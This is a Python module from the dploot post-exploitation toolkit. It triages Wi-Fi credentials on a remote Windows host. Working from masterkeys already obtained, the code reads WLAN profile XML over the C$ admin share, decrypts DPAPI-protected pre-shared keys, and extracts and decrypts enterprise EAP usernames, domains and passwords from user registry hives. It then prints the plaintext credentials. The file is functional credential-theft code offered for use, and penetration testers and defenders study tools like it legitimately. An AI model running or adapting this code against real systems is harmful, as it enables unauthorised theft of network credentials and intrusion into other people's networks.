from binascii import unhexlify
import itertools
import logging
import ntpath
from typing import Any, Dict, List, Optional, Callable
from lxml import objectify

from dploot.triage import Triage
from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.network import DPLootConnection
from dploot.lib.target import Target
from dploot.triage.masterkeys import Masterkey

EAP_TYPES = {
    13: "EAP TLS",
    18: "EAP SIM",
    21: "EAP TTLS",
    23: "EAP AKA",
    25: "PEAP",
    50: "EAP AKA PRIME",
}


class WifiCred:
    def __init__(
        self,
        ssid: str,
        auth: str,
        encryption: str,
        password: Optional[str] = None,
        xml_data: Any = None,
        eap_username: Optional[str] = None,
        eap_domain: Optional[str] = None,
        eap_password: Optional[str] = None,
    ) -> None:
        self.ssid = ssid
        self.auth = auth
        self.encryption = encryption
        self.password = password
        self.xml_data = xml_data

        # EAP params
        self.onex = None
        self.eap_host_config = None
        self.eap_type = None
        self.eap_username = eap_username
        self.eap_password = eap_password
        self.eap_domain = eap_domain

        if self.auth == "WPA2" or self.auth == "WPA":
            self.onex = getattr(
                self.xml_data.MSM.security,
                "{http://www.microsoft.com/networking/OneX/v1}OneX",
            )
            self.eap_host_config = getattr(
                self.onex.EAPConfig,
                "{http://www.microsoft.com/provisioning/EapHostConfig}EapHostConfig",
            )
            eap_type = int(
                getattr(
                    self.eap_host_config.EapMethod,
                    "{http://www.microsoft.com/provisioning/EapCommon}Type",
                )
            )
            self.eap_type = EAP_TYPES[eap_type]

    def dump(self) -> None:
        print("[WIFI]")
        print("SSID:\t\t%s" % self.ssid)
        if self.auth.upper() in ["WPAPSK", "WPA2PSK", "WPA3SAE"]:
            print("AuthType:\t%s" % self.auth.upper())
            print("Encryption:\t%s" % self.encryption.upper())
            print("Preshared key:\t%s" % self.password)
        elif self.auth.upper() in ["WPA", "WPA2"]:
            print("AuthType:\t%s EAP" % self.auth.upper())
            print("Encryption:\t%s" % self.encryption.upper())
            print("EAP Type:\t%s" % self.eap_type)
            if self.eap_username is not None and self.eap_password is not None:
                print("Credentials:\t", end="")
                if self.eap_domain is not None and len(self.eap_domain) != 0:
                    print("%s/" % self.eap_domain, end="")
                print(f"{self.eap_username}:{self.eap_password}")
            print()
            self.dump_all_xml(self.eap_host_config)
        elif self.auth.upper() == "OPEN":
            print("AuthType:\t%s" % self.auth.upper())
            print("Encryption:\t%s" % self.encryption.upper())
        print()

    def dump_all_xml(self, node, n: int = 0) -> None:
        key = node.tag
        if type(node) is objectify.ObjectifiedElement:
            key = key.split("}")[1] if "}" in key else key
            print("  " * n + key + ":")
            for element in node.iterchildren():
                self.dump_all_xml(element, n + 1)
        else:
            key = key.split("}")[1] if "}" in key else key
            print(f"{'  ' * n}{key}: {node.text}")

    def dump_quiet(self) -> None:
        if self.auth.upper() == "OPEN":
            print(f"[WIFI] {self.ssid} - OPEN")
        elif self.auth.upper() in ["WPAPSK", "WPA2PSK", "WPA3SAE"]:
            print(f"[WIFI] {self.ssid} - {self.auth.upper()} - Passphrase: {self.password}")
        elif self.auth.upper() in ["WPA", "WPA2"]:
            if self.eap_username is not None and self.eap_password is not None:
                print(
                    f"[WIFI] {self.ssid} - WPA EAP - {self.eap_type} - {self.eap_username}:{self.eap_password}"
                )
            else:
                print(f"[WIFI] {self.ssid} - WPA EAP - {self.eap_type}")
        else:
            print(f"[WIFI] {self.auth.upper()} - {self.ssid}")


class WifiTriage(Triage):
    system_wifi_generic_path = "ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces"
    share = "C$"

    eap_profiles_keys = (
        "SOFTWARE\\Microsoft\\Wlansvc\\Profiles",
        "SOFTWARE\\Microsoft\\Wlansvc\\UserData\\Profiles",
    )

    def __init__(
        self,
        target: Target,
        conn: DPLootConnection,
        masterkeys: List[Masterkey],
        per_profile_callback: Callable = None,
        false_positive: List[str] | None = None,
    ) -> None:
        super().__init__(
            target, 
            conn, 
            masterkeys=masterkeys, 
            per_loot_callback=per_profile_callback, 
            false_positive=false_positive
        )

    def triage_wifi(self) -> List[WifiCred]:
        wifi_creds = []
        try:
            wifi_dir = self.conn.list_dir(
                share=self.share, path=self.system_wifi_generic_path
            )
            if wifi_dir is not None:
                for directory in wifi_dir:
                    if (
                        directory.is_directory() > 0
                        and directory.get_longname() not in self.false_positive
                    ):
                        wifi_interface_path = ntpath.join(
                            self.system_wifi_generic_path, directory.get_longname()
                        )
                        wifi_interface_dir = self.conn.list_dir(
                            share=self.share, path=wifi_interface_path
                        )
                        for file in wifi_interface_dir:
                            filename = file.get_longname()
                            if (
                                file.is_directory() == 0
                                and filename not in self.false_positive
                                and filename[-4:].lower() == ".xml"
                            ):
                                wifi_interface_filepath = ntpath.join(
                                    wifi_interface_path, filename
                                )
                                logging.debug(
                                    f"Found Wifi connection file: \\\\{self.target.address}\\{self.share}\\{wifi_interface_filepath}"
                                )
                                wifi_interface_data = self.conn.read_file(
                                    share=self.share, path=wifi_interface_filepath, looted_files=self.looted_files
                                )
                                main = objectify.fromstring(wifi_interface_data)

                                ssid = main.SSIDConfig.SSID.name.text
                                auth_type = (
                                    main.MSM.security.authEncryption.authentication.text
                                )
                                encryption = (
                                    main.MSM.security.authEncryption.encryption.text
                                )

                                wifi_profile = None

                                if auth_type in ["WPA2PSK", "WPAPSK", "WPA3SAE"]:
                                    dpapi_blob = main.MSM.security.sharedKey.keyMaterial
                                    masterkey = find_masterkey_for_blob(
                                        unhexlify(dpapi_blob.text),
                                        masterkeys=self.masterkeys,
                                    )
                                    password = b""
                                    if masterkey is not None:
                                        cleartext = decrypt_blob(
                                            unhexlify(dpapi_blob.text),
                                            masterkey=masterkey,
                                        )
                                        if cleartext is not None:
                                            password = cleartext.removesuffix(b"\x00")
                                    wifi_profile = WifiCred(
                                        ssid=ssid,
                                        auth=auth_type,
                                        encryption=encryption,
                                        password=password.decode(
                                            "latin-1", errors="backslashreplace"
                                        ),
                                        xml_data=main,
                                    )
                                elif auth_type in ["WPA", "WPA2"]:
                                    creds = self.triage_eap_creds(filename[:-4])
                                    eap_username = None
                                    eap_password = None
                                    eap_domain = None
                                    if creds is not None:
                                        eap_username, eap_domain, eap_password = (
                                            _.decode(
                                                "latin-1", errors="backslashreplace"
                                            )
                                            for _ in creds
                                        )
                                    wifi_profile = WifiCred(
                                        ssid=ssid,
                                        auth=auth_type,
                                        encryption=encryption,
                                        xml_data=main,
                                        eap_username=eap_username,
                                        eap_domain=eap_domain,
                                        eap_password=eap_password,
                                    )
                                else:
                                    wifi_profile = WifiCred(
                                        ssid=ssid,
                                        auth=auth_type,
                                        encryption=encryption,
                                        xml_data=main,
                                    )

                                wifi_creds.append(wifi_profile)
                                if self.per_loot_callback is not None:
                                    self.per_loot_callback(wifi_profile)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
                logging.debug(f"{__name__}: {e!s}")
        return wifi_creds

    def triage_eap_creds(self, eap_profile) -> list[bytes]:
        msm_bytes = None
        try:
            for sid, eap_profile_key in itertools.product(
                self.users.values(), self.eap_profiles_keys
            ):
                # look for profile
                sub_key = f"{sid}\\{eap_profile_key}\\{eap_profile}"
                try:
                    msm_bytes = self.conn.reg_get_key_value("HKU", sub_key, "MSMUserData")
                    if msm_bytes is not None:
                        logging.debug(f"Found profile in registry at HKU\\{sub_key}")
                        break
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback

                        traceback.print_exc()
                        logging.debug(f"{__name__}: {e!s}")

            if msm_bytes is None:
                logging.debug("Could not find corresponding registry key")
                return None

            masterkey = find_masterkey_for_blob(msm_bytes, masterkeys=self.masterkeys)
            if masterkey is None:
                return None

            blob = decrypt_blob(blob_bytes=msm_bytes, masterkey=masterkey)
            # FIXME: it seems decrypt_blob sometimes adds zeroes at then end of the cleartext.
            # when the result is passed to decrypt_blob again later, the DPAPI_BLOB built from blob_bytes
            # will be valid, but its .rawData will contain extra bytes

            # This (loosely) follows what is described in "Dumping Stored Enterprise Wifi Credentials with Invoke-WifiSquid"
            # https://kylemistele.medium.com/dumping-stored-enterprise-wifi-credentials-with-invoke-wifisquid-5a7fe76f800 ,

            prefix = blob[168:176]
            username = blob[176:].split(b"\0")[0]
            domain = blob[176:].split(b"\0")[1]
            password = blob[432:].split(b"\0")[1]

            # if prefix is [0x03, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00] the password is not encrypted
            if prefix == b"\x04\x00\x00\x00\x02\x00\x00\x00":
                index = blob[176:].find(b"\x01\x00\x00\x00\xd0\x8c\x9d\xdf\x01")
                if index == -1:
                    logging.debug("Couldn't find password signature!")
                    return (username, domain, password)
                index += 176
                msm_bytes = blob[index:]
                masterkey = find_masterkey_for_blob(
                    msm_bytes, masterkeys=self.masterkeys
                )

                if masterkey is None:
                    logging.info("Couldn't find key to decrypt password.")
                    logging.info(
                        "Try saving machinemasterkeys and masterkeys in a file and launch again with this file as mkfile."
                    )
                    return (username, domain, password)

                found_password = decrypt_blob(blob_bytes=msm_bytes, masterkey=masterkey)
                if found_password is not None:
                    password = found_password.rstrip(b"\x00")
            return (username, domain, password)

        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
                logging.debug(str(e))
            return None
        return None

    @property
    def users(self) -> Dict[str, str]:
        """Returns dict of username: sid"""
        if self._users is not None:
            return self._users

        users = {}
        userlist_key = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList"

        for sid in self.conn.reg_enum_key("HKLM",userlist_key):
            profile_path = self.conn.reg_get_key_value("HKLM",f"{userlist_key}\\{sid}","ProfileImagePath")
            if "C:\\Users" not in profile_path:
                continue
            users[ntpath.basename(profile_path).rstrip("\0")] = sid.rstrip("\0")
        self._users = users
        return self._users